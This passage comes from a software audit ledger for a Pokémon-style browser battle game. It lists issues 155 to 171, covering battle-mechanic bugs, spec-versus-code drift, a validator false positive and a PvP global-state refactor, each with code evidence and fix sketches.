**Verification**: `grep -n "4156" docs/design-audit/DESIGN_CONSISTENCY_CHECKLIST.md` → 0 hits; range matches `grep -nE "</style>" battle.html`.

---

## <a id="ISSUE-155"></a> ISSUE-155: Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME`

---
id: ISSUE-155
severity: P2
category: inconsistency
anchor_symbol: ELITE_VICTORY_LINES
current_line_hint: ~28371
file: battle.html
agents: [consistency-auditor]
fingerprint: 9da9210ce0f7
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME`

**Evidence**:
```js
// L28391  ELITE_VICTORY_LINES has:
'Malva':"Malva: \"You snuffed my fire. The next gate awaits.\"",
// But she is the ONLY canonical Elite Four member missing from
// TRAINER_QUOTES_BY_NAME — every other E4 has 3+ intro lines there.
```

**Repro**: Force a Kalos E1 roll (`?seed=…` that picks Kalos), reach E1 — Malva runs the generic 'E1' pool while every other E4 gets a 3-line personal pool.

**Blast radius**: Single character. Easy fix.

**Fix sketch**: Add a `'Malva': [...]` entry next to the other E4 / Kalos block at ~L29516-29519 in `TRAINER_QUOTES_BY_NAME`. Three short fire-themed lines.

**Verification**: Manual playthrough hitting the Kalos E1 slot.

---

## <a id="ISSUE-156"></a> ISSUE-156: Leech Seed end-of-turn drain ignores Magic Guard (holder loses HP, seeder heals)

---
id: ISSUE-156
severity: P2
category: bug
anchor_symbol: endOfTurnEffects
current_line_hint: ~28183
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 8f218d3586ac
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Leech Seed end-of-turn drain ignores Magic Guard (holder loses HP, seeder heals)

**Evidence**:
```js
// endOfTurnEffects — Leech Seed block sits OUTSIDE the status-damage Magic Guard gate
// (the `if (mon.ability !== "Magic Guard")` at the burn/poison block) and had no guard of its own:
if (mon.volatile.leechSeed) {            // <- no Magic Guard check (Curse/Salt Cure both have one)
    let drain = Math.max(1, Math.floor(mon.maxHp / 8));
    mon.currentHp -= Math.min(mon.currentHp, drain);
    if (foe.currentHp > 0) foe.currentHp += ...;   // seeder wrongly heals too
}
```
Magic Guard prevents all indirect damage, including Leech Seed (Bulbapedia). Curse (`mon.ability !== "Magic Guard"`)
and Salt Cure already guard correctly; Leech Seed and partial-trap did not.

**Repro**: `node scripts/debug/_repro/magicguard-residual.mjs` — a Magic Guard Clefable with `leechSeed` loses 0 HP and the foe heals 0 after the fix (Cute Charm control loses 1/8 and the foe heals).

**Blast radius**: Every Magic Guard mon (Clefable, Reuniclus, Sigilyph) that gets Leech-Seeded — it took chip it should be immune to, and fed the seeder HP. Affects stall/PvE longevity math and seeded replays.

**Fix sketch**: Add `&& mon.ability !== "Magic Guard"` to the Leech Seed condition so neither the drain nor the seeder heal occurs (the seed volatile still persists).

**Verification**: `magicguard-residual.mjs` shows Magic Guard loses 0 to Leech Seed; full suite 897 pass / 0 fail.

---

## <a id="ISSUE-157"></a> ISSUE-157: Partial-trap (Bind / Fire Spin / Whirlpool / Sand Tomb) end-of-turn damage ignores Magic Guard

---
id: ISSUE-157
severity: P2
category: bug
anchor_symbol: endOfTurnEffects
current_line_hint: ~28217
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 8e643c7a0df7
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Partial-trap (Bind / Fire Spin / Whirlpool / Sand Tomb) end-of-turn damage ignores Magic Guard

**Evidence**:
```js
if (mon.volatile.partialTrap > 0 && !_stickyTrap) {
    mon.volatile.partialTrap--;
    if (story nullifier) { ... } else {
        let trapDmg = Math.max(1, Math.floor(mon.maxHp / 8));   // <- no Magic Guard check
        mon.currentHp -= Math.min(mon.currentHp, trapDmg);
    }
}
```
Magic Guard prevents partial-trap chip in canon, but the trap should still expire on schedule.

**Repro**: `node scripts/debug/_repro/magicguard-residual.mjs` — Magic Guard mon under Fire Spin loses 0 HP but its trap counter still ticks 3→2.

**Blast radius**: Any Magic Guard mon caught by a binding move. Lower frequency than Leech Seed but same class of bug.

**Fix sketch**: Branch the damage on `mon.ability === "Magic Guard"` (skip damage), keeping the counter decrement and the "was freed" message outside the damage branch so the trap still expires and reports correctly.

**Verification**: `magicguard-residual.mjs`; full suite 897 pass / 0 fail.

---

## <a id="ISSUE-158"></a> ISSUE-158: Relic vs Artifact used interchangeably for one object across label/key/fn/state

---
id: ISSUE-158
severity: P2
category: inconsistency
anchor_symbol: enterArtifactShop
current_line_hint: ~42922
file: battle.html
agents: [consistency-auditor]
fingerprint: a43436a263d4
confidence: high
status: open
---

**Title**: Relic vs Artifact used interchangeably for one object across label/key/fn/state

**Evidence**:
```js
// 42922: makeActionBtn('✨ Relic Annex','relic',...enterArtifactShop()...)  // buy
// 42963: makeActionBtn('✨ Artifact Hall','artifacts',...enterArtifactHall()...) // toggle
// state: sm.artifactShopOffersByCity, sm.artifactFreeClaimUsed; icon story_artifacts.png
// 50172 copy: "The Relic Annex. ... If you want one off the field, the Artifact Hall..."
```

**Repro**: grep -niE 'relic|artifact' battle.html — same noun, two words; key=relic but fn/state=artifact.

**Blast radius**: Two facility names ("Relic Annex" buys, "Artifact Hall" toggles) share one ✨ emoji and one icon; players can't tell them apart. Internal key/fn mismatch (relic key → enterArtifactShop) is a maintenance hazard.

**Fix sketch**: Pick ONE noun for the object (e.g. "Relic"). Keep distinct facility names by role: "Relic Shop" + "Relic Vault/Toggle". Pure-text for labels; internal rename (key vs fn) is a behavior-preserving refactor.

**Verification**: One canonical noun in all player copy; key/fn/state names agree.

---

## <a id="ISSUE-159"></a> ISSUE-159: PLAN COLLISION — Daycare unlock is keyed on the "Gym Leader 1" event name, not a city; redesign wants C2/C4/C6

---
id: ISSUE-159
severity: P2
category: refactor
anchor_symbol: enterDaycare
current_line_hint: ~42313
file: battle.html
agents: [story-mode-investigator]
fingerprint: 145ee8564182
confidence: high
status: open
---

**Title**: PLAN COLLISION — Daycare unlock is keyed on the "Gym Leader 1" event name, not a city; redesign wants C2/C4/C6

**Evidence**:
```js
// battle.html:42313 — current unlock trigger
if (en === 'Gym Leader 1' && !sm.daycare.unlocked) {
    sm.daycare.unlocked = true;
    ...
}
// battle.html:39513
const STORY_EGG_HATCH_BADGE = 7;   // hatch gate is badge-based
```

**Repro**: Current code: Daycare unlocks on the Gym Leader 1 VICTORY (event-name match), appears from City1 post-gym onward, egg hatches after badge 7 (`STORY_EGG_HATCH_BADGE`), Fight Club secret at badges≥6. REDESIGN_PLAN §3/§6 wants: Daycare facility at C2/C4/C6, hatch at `pickupCity+2` (store `eggLaidAtCity`), and a SAVE_VER bump to re-key the unlock. The current event-name keying (`en === 'Gym Leader 1'`) and badge-7 hatch gate are exactly the spots the plan must rewrite.

**Blast radius**: Direct plan-vs-code collision flagged for the maintainer. The unlock predicate, the hatch gate (`STORY_EGG_HATCH_BADGE`, used at 5 sites incl. UI strings 39775/40474/42973/43010), and the Fight Club secret gate (badges≥6 at 39006) all need migration. `_daycareIsUnlocked()` reads `sm.daycare.unlocked` — a boolean that won't carry the new city-relative semantics without a v21 migration.

**Fix sketch**: When implementing the redesign: (1) gate Daycare visibility on `actions.includes('Daycare')` added to C2/C4/C6 rows (mirrors Safari's city-gating at 39026), NOT an event-name flag; (2) replace `STORY_EGG_HATCH_BADGE` with `eggLaidAtCity + 2` stored on the egg slot; (3) bump SAVE_VER and grandfather in-progress eggs (per §6). All five `STORY_EGG_HATCH_BADGE` references + the four UI strings must change together.

**Verification**: A v20 save mid-egg-quest loads cleanly post-bump; egg hatches at pickupCity+2.

---

## <a id="ISSUE-160"></a> ISSUE-160: Poké Center never clears Fatigue, yet the in-game bulletin tells players a Center stay clears it

---
id: ISSUE-160
severity: P2
category: bug
anchor_symbol: enterPokemonCenter
current_line_hint: ~47348
file: battle.html
agents: [story-mode-investigator]
fingerprint: d317e1091ec7
confidence: high
status: open
---

**Title**: Poké Center never clears Fatigue, yet the in-game bulletin tells players a Center stay clears it

**Evidence**:
```js
// enterPokemonCenter() — opens PC/Underground, plays SFX, gifts one Full Restore.
// It NEVER calls _storyFullHealPartySlots() (the only thing that zeroes build.tired).
// Meanwhile _storyShowTirednessIntro() bulletin says:
//   "A short stay at a Pokémon Center restores HP, PP, status, AND clears Fatigue."
// build.tired persists across non-iconic battles (routes/Basic Trainers +1 each, cap 3)
// and is only reset by iconic fights, retreat-to-city, or pits.
```

**Repro**: Fight several non-iconic route/Basic trainers to stack build.tired, enter a Pokémon Center, reopen Party — fatigue stacks remain (each docks 1% stats + starting HP). The bulletin promised the Center would clear them.

**Blast radius**: Fatigue is a real persistent stat debuff (buildPokemon line ~14828). Players who follow the bulletin's instruction get no relief; only path is reaching the next iconic fight or retreating (which also halves gold on harder difficulties).

**Fix sketch**: Either (a) call _storyFullHealPartySlots() inside enterPokemonCenter() so the Center honors the bulletin, or (b) correct the bulletin text to say only iconic fights/retreat clear fatigue. Behavior choice is balance-owned (maxwell) — flag, don't ship.

**Verification**: After fix-a, build.tired === 0 for all party members after a Center visit; after fix-b, bulletin no longer mentions the Center clearing fatigue.

---

## <a id="ISSUE-161"></a> ISSUE-161: Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive

---
id: ISSUE-161
severity: P2
category: dx
anchor_symbol: expandCommaAlternatives
current_line_hint: ~69
file: scripts/debug/data-validator.mjs
agents: [data-integrity-auditor]
fingerprint: 2d5d47372205
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive

**Evidence**:
```js
function expandCommaAlternatives(value) {
  if (!value) return [];
  if (Array.isArray(value)) return value.flatMap(expandCommaAlternatives);  // ← recurses into array
  return String(value).split(',').map(s => s.trim()).filter(Boolean);
}
// caller:
const alternatives = expandCommaAlternatives(raw);
if (alternatives.length > 1) commaAlternativeFields++;  // ← counts array len > 1 as CSV
```

**Repro**: `for f in data/builds/gen*.json; do node -e "..."; done` confirms zero comma-separated `item`/`ability`/`nature` strings across all six files; the schema is uniformly array-based. The validator output `Build alternative format is inconsistent — moves use array literals, ability/item/nature use comma-separated strings (6925 occurrences)` is therefore misleading.

**Blast radius**: Anyone who reads the data-integrity report (including this auditor) gets a P2 inconsistency claim that doesn't exist. Wastes triage cycles. The validator also undercounts genuine CSV-encoded slots if any are added in the future, because the array path is taken first.

**Fix sketch**: In `expandCommaAlternatives`, only increment `commaAlternativeFields` when the input was a string containing a comma. Restructure so the CSV-vs-array classification is made on the raw input type, not on the flattened result length. The "alternatives expansion" pass for legality validation should remain unchanged.

**Verification**: Re-run `node scripts/debug/data-validator.mjs`; the P2 "inconsistent format" finding should disappear (or only fire if a real CSV is added).

---

## <a id="ISSUE-162"></a> ISSUE-162: Facility debut cities disagree 3 ways (code FACILITY_DEBUT_CITY vs both balance docs vs in-code comments)

---
id: ISSUE-162
severity: P2
category: inconsistency
anchor_symbol: FACILITY_DEBUT_CITY
current_line_hint: ~30660
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 0d3a51e62bd1
confidence: high
status: open
---

**Title**: Facility debut cities disagree 3 ways (code FACILITY_DEBUT_CITY vs both balance docs vs in-code comments)

**Evidence**:
```text
battle.html FACILITY_DEBUT_CITY: safari: 5, dept: 4, evtrainer: 7, dojo: 1
PROGRESSION_CURVE_MASTER.md §2i: Safari C4, Dept C6, EV Trainer C4(§3.3 R1 "evtrainer=4"), Dojo C4
STORY_MODE_FLOW.md §14c/§15f:   Safari C4, Dept Store C6, EV Trainer C4, Battle Dojo C4
battle.html:48763 (comment): "Safari unlocks at City 4 (badges 3)"  ← contradicts safari:5 above
battle.html:11358 (help):     "Safari Zone (City 5)"                ← matches code value, not docs
```

**Repro**: `grep -nE "safari:|dept:|evtrainer:|dojo:" battle.html` in the `FACILITY_DEBUT_CITY` block → `safari: 5, dept: 4, evtrainer: 7, dojo: 1`. Compare PROGRESSION_CURVE_MASTER.md §2i ("C4: Safari, Battle Dojo, EV Trainer") and STORY_MODE_FLOW.md §15f NPC-placement table ("EV Trainer ... City 4 first", "Battle Dojo ... City 4 first"). The doc table and the code constant disagree on safari (4 vs 5), dept (6 vs 4), evtrainer (4 vs 7), dojo (4 vs 1). Even the code's own §48763 comment contradicts its `safari:5` constant.

**Blast radius**: This is a real balance-staging conflict, not just doc drift — `FACILITY_DEBUT_CITY` gates the Stone Sage debut, force-visit gates, and the EVOLUTION_FLOW voucher schedule. The reward→facility alignment claims in PROGRESSION_CURVE_MASTER §2h/§3.3 R1 are computed against the wrong debut cities (it asserts `FACILITY_DEBUT_CITY.evtrainer=4` while code is 7), so the "Vitamin Pack drops before EV Trainer" defect analysis is itself miscalibrated. ledger ISSUE-279/9057 touch the Safari-city edge but not the full constant-vs-docs divergence.

**Fix sketch**: Treat `FACILITY_DEBUT_CITY` as source of truth, pick the intended schedule with the maintainer (balance number — user-owned), then update STORY_MODE_FLOW §14c/§15f + PROGRESSION_CURVE_MASTER §2i/§3.3-R1 and the contradicting in-code comments (battle.html:48763, 11358) to match.

**Verification**: All four cite the same per-facility debut city; the §3.3-R1 voucher-alignment analysis re-runs against the corrected `FACILITY_DEBUT_CITY`.

---

## <a id="ISSUE-163"></a> ISSUE-163: Early-game softening is a per-CITY table in code, not the per-event named constants both balance docs describe

---
id: ISSUE-163
severity: P2
category: inconsistency
anchor_symbol: FOE_STAT_NERF_BY_CITY
current_line_hint: ~14943
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 02e46f6ff336
confidence: high
status: open
---

**Title**: Early-game softening is a per-CITY table in code, not the per-event named constants both balance docs describe

**Evidence**:
```js
const FOE_STAT_NERF_BY_CITY = [0.80, 0.85, 0.90]; // index = city; City >=3 -> 1.0
// vs STORY_MODE_FLOW.md §8/§15f + PROGRESSION_CURVE_MASTER.md §2d, which describe:
//   PRE_GYM1_FOE_STAT_MULT=0.82, EARLY_GL_FOE_STAT_MULT=0.95 (GL1/GL2),
//   EARLY_GAME_FOE_STAT_MULT=0.92 (routes), STAGE2_GL_FOE_STAT_MULT=0.97 (GL3)
```

**Repro**: `grep -nE "PRE_GYM1_FOE_STAT_MULT|EARLY_GL_FOE_STAT_MULT|EARLY_GAME_FOE_STAT_MULT|STAGE2_GL_FOE_STAT_MULT" battle.html` → 0 hits (the named constants do not exist). The live mechanism is `_earlyGameFoeStatMult()` (battle.html:14953) reading `FOE_STAT_NERF_BY_CITY` keyed on the current city: C0→0.80, C1→0.85, C2→0.90, C3+→1.0. So softening ends after City 2 (post-GL2), and the GL1/GL2-specific 0.95 and GL3 0.97 carve-outs both docs detail do not exist.

**Blast radius**: Both balance docs' §8/§15f/§2d softening tables (and the "softening extends through Gym 3", "GL3 0.97" claims) describe a model the code does not implement. Any retune that edits "the named constants" would touch nothing. The actual early curve (0.80/0.85/0.90 by city) is materially gentler at C0 and ends earlier than documented. Distinct from ledger ISSUE-095 (GL4=GL5 plateau, which is about `_stageGatedFoeStatMult`).

**Fix sketch**: Decide whether `FOE_STAT_NERF_BY_CITY` or the per-event constant model is intended (balance number — user-owned), then make code and docs agree. If keeping the city table, rewrite STORY_MODE_FLOW §8/§15f and PROGRESSION_CURVE_MASTER §2d to describe `FOE_STAT_NERF_BY_CITY` and delete the phantom constant names.

**Verification**: The softening table in both docs lists the same values/keys the code actually applies; `grep` for any constant name cited in a doc resolves in battle.html.

---

## <a id="ISSUE-164"></a> ISSUE-164: No sleep clause in story + AI scores Spore at 100 → up to 3-turn lock loops, amplified by high-tier stat bloat (fairness risk)

---
id: ISSUE-164
severity: P2
category: balance
anchor_symbol: getBestMove
current_line_hint: ~19063
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1b994537ce76
confidence: high
status: open
---

**Title**: No sleep clause in story + AI scores Spore at 100 → up to 3-turn lock loops, amplified by high-tier stat bloat (fairness risk)

**Evidence**:
```js
// getBestMove sleep-move scoring (19063): Spore baseScore 100, others 75 — top priority.
else if (["Spore","Sleep Powder","Hypnosis","Lovely Kiss","Sing","Dark Void","Yawn"].includes(move.name)) {
    let baseScore = move.name === "Spore" ? 100 : 75;
// applyStatus (26902): sleepDuration = floor(Math.random()*3)+1  -> 1..3 turns, uniform.
// pre-move gate (25204-25211): wakes only when statusTurns >= sleepDuration. No sleep clause
// anywhere in story (only Electric-Terrain artifact blocks sleep). PAR gate (25218): 25% skip.
```

**Repro**: `scripts/debug/_repro/fairness-locks.mjs` (seeded, real RNG). Over sampled seeds: **3-turn sleeps occur 38.2%** of the time; worst paralysis full-para streak = **6 consecutive skips** in a 30-turn window; turn-1 "player full-para AND foe crit" co-occurs ~1.0% (matches theory). Mechanics are Showdown-faithful (so not a damage/RNG *bug*), but at `challenge` (1.30x foe stats) a turn-1 Spore from a competent AI hands a fast foe up to 3 free turns with no player counterplay (no sleep-turn reduction, no clause).

**Blast radius**: Any high-tier fight where the foe rolls a sleep/para move (Gengar/Amoonguss/Breloom archetypes the rival/league field). Compounds the P1 stat-wall: identical RNG variance hits harder when the foe is +85% bulkier/stronger.

**Fix sketch**: Consider a story sleep clause (or cap effective sleep at 1-2 turns at lower tiers), and/or down-weight the AI's turn-1 status-lock scoring on lower difficulties so lock loops are a high-tier threat rather than a flat one.

**Verification**: Seeded battle with a foe holding Spore + a sweeper; assert max consecutive player-skipped turns is bounded by the chosen clause/cap.

---

## <a id="ISSUE-165"></a> ISSUE-165: When every damaging move is immune (score 0), AI throws a 0-dmg attack instead of switching/using status

---
id: ISSUE-165
severity: P2
category: inconsistency
anchor_symbol: getBestMove
current_line_hint: ~19064
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 607fa56cad8d
confidence: medium
status: open
---

**Title**: When every damaging move is immune (score 0), AI throws a 0-dmg attack instead of switching/using status

**Evidence**:
```js
if (eff === 0 || abilityImmunity(move, defender, attacker)) score = 0;   // all dmg moves -> 0
...
score += Math.random() * 6;                       // tiny tiebreak now decides among equal-0 moves
if (score > maxScore) { maxScore = score; bestMove = move; }
```
With a pure-attacking moveset where every move is type/ability-immune to the defender, all scores collapse to `0 + rand*6`. The AI returns whichever zero-damage move the tiebreak favors rather than recognizing the dead matchup.

**Repro**: `node scripts/debug/_repro/issue1d-allzero.mjs`: all-Fighting/Normal Hitmonchan vs Gengar (Ghost) — all four moves estimate 0, AI still returns a damaging move. (Distinct from finding 844cf… which is the choice-lock variant; this is the no-status, all-immune case.)

**Blast radius**: Narrow — requires a moveset with no status move and zero coverage against the active defender (uncommon outside contrived/mono builds). Mostly a quality issue: the AI "looks dumb" rather than getting exploited into a hard loop. Not reproducible as an infinite loop because the normal matchup usually has SOME nonzero move or a status move (which scores 12 and wins).

**Fix sketch**: When `maxOwnDmg === 0` (no move can damage the defender) and a bench exists, let `aiDecision` consider switching even outside the `willDieFirst || walled` triggers; or have `getBestMove` prefer the highest-utility status move over a guaranteed-0 attack.

**Verification**: Re-run `issue1d-allzero.mjs`; confirm the AI prefers a status move (if any) or that `aiDecision` switches when `maxOwnDmg === 0` and a viable bench mon exists.

---

## <a id="ISSUE-166"></a> ISSUE-166: Salac Berry grants a phantom 1.5x Speed while merely held at <=25% HP (not consumed)

---
id: ISSUE-166
severity: P2
category: bug
anchor_symbol: getEffectiveSpeed
current_line_hint: ~21374
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 2237f9cefc92
confidence: high
status: fixed-claude/funny-clarke-EnGMv
---

**Title**: Salac Berry grants a phantom 1.5x Speed while merely held at <=25% HP (not consumed)

**Evidence**:
```js
if (_spdItemActive && mon.item === "Salac Berry" && mon.currentHp <= mon.maxHp * 0.25) spe *= 1.5;
```

**Repro**: `node scripts/debug/_repro/salac-speed.mjs` — Jolteon base Speed 150. Drop to <=25% HP while still HOLDING an un-eaten Salac → `getEffectiveSpeed` returns 225 (1.5x) before any consumption. Worse, with Unnerve on the foe (which prevents Salac from ever being eaten) the holder still reads 225. The real effect (+1 Speed stage on EoT consumption) is already applied separately at `endOfTurnEffects` (~28207).

**Blast radius**: Turn order whenever a Salac holder is at <=25% HP before the EoT eat, and any case where consumption is suppressed (Unnerve, Embargo, Magic Room — `_spdItemActive` here doesn't even check Klutz/Unnerve). Salac is a treated as a passive held-item multiplier like Choice Scarf, which is incorrect; it should only ever act through the +1 stage it grants on being eaten.

**Fix sketch**: Delete the line — Salac's speed boost is the +1 stage applied on consumption (already handled in `endOfTurnEffects`). No held-item multiplier belongs in `getEffectiveSpeed`.

**Verification**: Re-run `salac-speed.mjs`; a <=25% HP Salac holder must read base Speed (150) until the EoT eat, after which the +1 stage (×1.5) applies and the item is gone.

---

## <a id="ISSUE-167"></a> ISSUE-167: City-3 HUD/route name falls back to "City 3" — GYM_CITY_LEADER_EVENT array-index keys trainerAssignments (row-id keyed)

---
id: ISSUE-167
severity: P2
category: bug
anchor_symbol: getStoryDisplayTownNameForCityRow
current_line_hint: 44238-44246 (also updateHUD 43275-43277)
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4becfea84542
confidence: high
status: open
---

**Title**: City-3 HUD/route name falls back to "City 3" — GYM_CITY_LEADER_EVENT array-index keys trainerAssignments (row-id keyed)

**Evidence**:
```js
// GYM_CITY_LEADER_EVENT (battle.html:32985) stores the ARRAY INDEX i:
if (m) out[parseInt(m[1], 10)] = i;            // City3 -> arrIdx 17
// getStoryDisplayTownNameForCityRow (44244) & updateHUD (43275) key by it:
const leaderEvIdx = GYM_CITY_LEADER_EVENT[cityIdx];        // 17
const leaderName  = sm.trainerAssignments[leaderEvIdx];    // BUT trainerAssignments is keyed by ROW-ID
// assignTrainers keys by row-id: sm.trainerAssignments[idx] where idx = ev[0]  (Gym Leader 3 row-id = 18)
```

**Repro**: jsdom harness — for City3 the GL3 leader lives at array index 17 but carries row-id 18 (the Rival row 12 is interleaved at arrIdx 18, shifting GL3). `GYM_CITY_LEADER_EVENT[3]=17`, but the GL3 name is stored under `trainerAssignments[18]`. `trainerAssignments[17]` is the *Gym Trainer 1* name, which is absent from `GYM_LEADER_CITY_NAMES`, so both `updateHUD` and `getStoryDisplayTownNameForCityRow` fall through to the generic `'City 3'`. Verified via boot script: for cities 1,2,4–8 arrIdx==rowId (coincidentally), so City 3 is the lone victim.

**Blast radius**: HUD city title at City 3, the "→ Set Out for <town>" route button label that names City-3's town, and any other `getStoryDisplayTownNameForCityRow` consumer. Cosmetic only — no progression impact. (Prior-audit ISSUE-132; re-verified STILL PRESENT in current code.)

**Fix sketch**: Either build `GYM_CITY_LEADER_EVENT` to store row-ids (`out[...] = row[0]`) so the `trainerAssignments` lookup matches, or convert the array-index to a row-id at the lookup site (`STORY_EVENTS_RAW[leaderEvIdx][0]`). One-line fix in two call sites.

---

## <a id="ISSUE-168"></a> ISSUE-168: 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable

---
id: ISSUE-168
severity: P2
category: refactor
anchor_symbol: global_state_coupling
current_line_hint: ~447
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 8a35ede06e36
confidence: high
status: open
---

**Title**: 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable

**Evidence**:
```js
// 18 distinct globals, cataloged from grep -nE 'global\.__\w+' online-pvp.js:
// __PBS_SUPABASE_URL (L22, L38)              // config
// __PBS_SUPABASE_ANON_KEY (L23, L38)         // config
// __onlineMatchTimerPreset (L99, L288, L403)
// __onlineMatchFormat (L103, L455, L753)
// __hostOnlineBattleStarted (L447) + __onlineHostDraftDeadlinePrimed (L451)
// __guestLastResolved (L448) + __guestBattleStartApplied (L449)
// __onlineGuestJoined (L450) + __onlineGuestRematchApplied (L456)
// __onlineP1Wins / __onlineP2Wins / __onlineRoundNumber (L452-454, L650-652, L750-752)
// __onlineHostName / __onlineGuestName (L457-458, L748-749, L791-792)
// __onlineBattleDeadlineFiring (L671, L679, L699)
// __runLockedPvPTurnResolution (L604-605)
// __onlinePvpConfigured (L818) // export
```

**Repro**: `grep -nE 'global\.__\w+' online-pvp.js | wc -l` → 36. Then `grep -nE '__online' battle.html | wc -l` for the consumer side (likely >50). Every global is a synchronization channel between the PvP module and the main battle code; there's no schema, no `defineProperty` reactivity, no central reset. The `dispose` method at L446-460 enumerates the resets manually — every new global added to the module must remember to wire into dispose's `catch(e){}` block, or stale state leaks across rooms.

**Blast radius**: Maintenance & correctness. Real symptoms: a new `__onlineFoo` flag added without a `dispose` reset leaves the second match in the same browser session in a half-stuck state. The `try { ... } catch (e) {}` at L460 even silences the AssertionError if you typo a global name during a reset.

**Fix sketch**: Wrap all PvP-related cross-module state in a single `global.OnlineBattle.session = { hostName: null, guestName: null, p1Wins: 0, ... }` object. Provide a `resetSession()` method that the host calls on `dispose` and on each rematch. Consumers in `battle.html` read `OnlineBattle.session.hostName` instead of `__onlineHostName`. Migration is mechanical (sed/codemod). Optional: make the object a Proxy that logs writes in `__DEBUG_PVP=true` mode to catch which global is mutating when.

**Verification**: After refactor, `grep -nE 'global\.__online\w+|global\.__host\w+|global\.__guest\w+' online-pvp.js | wc -l` should drop to 0 (or only the config keys). dispose's manual reset block goes away in favor of `this.session = freshSession()`.

---

## <a id="ISSUE-169"></a> ISSUE-169: City-3 display name always falls back to "City 3" — GYM_CITY_LEADER_EVENT returns an array index, but trainerAssignments is keyed by row ID

---
id: ISSUE-169
severity: P2
category: bug
anchor_symbol: GYM_CITY_LEADER_EVENT
current_line_hint: ~39601
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6ff4d34cde7f
confidence: high
status: open
---

**Title**: City-3 display name always falls back to "City 3" — GYM_CITY_LEADER_EVENT returns an array index, but trainerAssignments is keyed by row ID

**Evidence**:
```js
// GYM_CITY_LEADER_EVENT stores the ARRAY INDEX i (line 29966: out[...] = i)
const leaderEvIdx = GYM_CITY_LEADER_EVENT[cityIdx];        // = 17 for Gym Leader 3
const leaderName = sm.trainerAssignments && sm.trainerAssignments[leaderEvIdx]; // keyed by ROW ID, not index!
return (leaderName && GYM_LEADER_CITY_NAMES[leaderName]) || ('City ' + cityIdx);
```

**Repro**: STORY_EVENTS_RAW is NOT index==id everywhere. Gym Leader 3 sits at array index 17 but its row ID is 18 (the v9 intro-rival insertion + a Rival re-order push later rows out of alignment). `sm.trainerAssignments` is written as `trainerAssignments[ev[0]]` (row ID, ~line 34842). So for City 3 the lookup returns `trainerAssignments[17]` = the Gym Trainer 1 (id 17 at index 16), whose name is NOT in GYM_LEADER_CITY_NAMES → the HUD and city header show literal "City 3" instead of the leader's themed town (e.g. "Celadon City"). Verified by enumerating the timeline: only GL3 mismatches (all other gyms coincidentally have index==id). Two call sites: `updateHUD` (~38770) and `getStoryDisplayTownNameForCityRow` (~39601).

**Blast radius**: HUD city label + city screen town name for City 3 specifically. Latent for ALL cities: any future timeline edit that shifts a gym leader's index off its row ID silently breaks that city's name. Same fragile pattern in 2 functions.

**Fix sketch**: GYM_CITY_LEADER_EVENT should map cityIdx → row ID (`out[...] = row[0]`), OR the two consumers should convert index→id via `STORY_EVENTS_RAW[leaderEvIdx][0]` before indexing trainerAssignments. The map name says "EVENT" (id-like) but stores an index — pick one convention and make GYM_CITY_LEADER_EVENT's only consumers agree.

**Verification**: After fix, `getStoryDisplayTownNameForCityRow` for the City3 row returns the assigned GL3 leader's town from GYM_LEADER_CITY_NAMES (not "City 3"). Add a boot assertion that for every cityIdx 1..8, `STORY_EVENTS_RAW[GYM_CITY_LEADER_EVENT[cityIdx]][2] === 'Gym Leader '+cityIdx`.

---

## <a id="ISSUE-170"></a> ISSUE-170: In-game Help "Catching" section still points players to the cut Caged God arc

---
id: ISSUE-170
severity: P2
category: inconsistency
anchor_symbol: helpText
current_line_hint: ~11355
file: battle.html
agents: [story-mode-investigator]
fingerprint: 98cc2054989a
confidence: high
status: fixed-claude/gracious-goodall-QFuQF
---

**Title**: In-game Help "Catching" section still points players to the cut Caged God arc

**Evidence**:
```html
<!-- Help / Catching section, ~11355 -->
Wild routes between cities surface one wild Pokémon each. The Safari Zone in City 5 runs as a self-contained session with its own balls, Bait, and Rocks. The Caged God in the post-game needs the Master Ball — saved for that one fight.
```

The "Caged God in the post-game needs the Master Ball — saved for that one fight" line is stale content: the Caged God boss arc was permanently cut in v24 (STORY_MODE_FLOW.md §9 "❌ REMOVED (v24)"; `migrateStoryPreV24` strips its save state). The Master Ball is now the roaming-legendary reward (Road 7, pre-HoF), not a post-game cage. Players following this guidance will hoard their one Master Ball for a fight that never appears. The same help block (line 11366) also still names "Subject Zero" as unsellable, which is only reachable through the dead boss-mode catch path.

**Repro**: Open in-game Help → Catching section. The Caged God / Master Ball guidance is shown verbatim.

**Blast radius**: Player-facing onboarding text only; misdirects Master Ball usage and references a non-existent encounter.

**Fix sketch**: Rewrite the Catching help to describe the Master Ball as the roaming-legendary reward (pre-HoF) and drop the Caged God / Subject Zero references (or scope them behind a real feature). Also reconcile the "Safari Zone in City 5" wording with the spec's "City 4 — Wilderness town" if the canonical naming is City 4.

**Verification**: Help text no longer mentions Caged God; Master Ball guidance matches the roaming-legendary flow.

---

## <a id="ISSUE-171"></a> ISSUE-171: City-8 "Required" legendary handoff silently downgrades to a normal Professor gift when the party is below cap

---
id: ISSUE-171
severity: P2
category: inconsistency
anchor_symbol: isPreLeagueLegendaryMysteryGate
current_line_hint: 33088-33092; gate firing 43334-43338, 45838-45850
file: battle.html
agents: [story-mode-investigator]
fingerprint: 567292b036c3
confidence: high
status: fixed-claude/relaxed-bell-2X3Ys
---

**Title**: City-8 "Required" legendary handoff silently downgrades to a normal Professor gift when the party is below cap

**Evidence**:
```js
// The legendary-mystery branch requires BOTH the gate AND a full party:
